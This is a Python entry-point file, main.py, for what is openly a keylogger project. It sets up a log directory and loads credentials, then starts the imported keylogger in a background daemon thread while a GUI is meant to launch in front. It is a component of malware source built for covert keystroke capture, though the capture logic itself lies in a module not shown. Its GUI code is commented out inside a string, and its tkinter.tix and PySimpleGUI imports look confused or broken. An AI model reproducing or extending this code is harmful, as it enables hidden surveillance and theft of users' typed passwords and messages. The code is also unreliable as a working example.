# main.py
import threading
from tkinter.tix import Control
from setup import setup_log_directory
from keylogger import start_keylogger, load_credentials, load_config
from PySimpleGUI import main as gui_main


def main():
    # Step 1: Run the setup to ensure the log directory is configured
    log_directory = setup_log_directory()

    # Step 2: Load credentials to get the username
    credentials = load_credentials()
    username = credentials["username"]
    load_config()

    # Step 3: Start the keylogger in a separate daemon thread
    keylogger_thread = threading.Thread(target=start_keylogger, args=(log_directory, username), daemon=True)
    keylogger_thread.start()

    # Step 4: Launch the GUI
''' Control(
        controls=[
            gui_main(),
        ]
    )'''


if __name__ == "__main__":
    main()
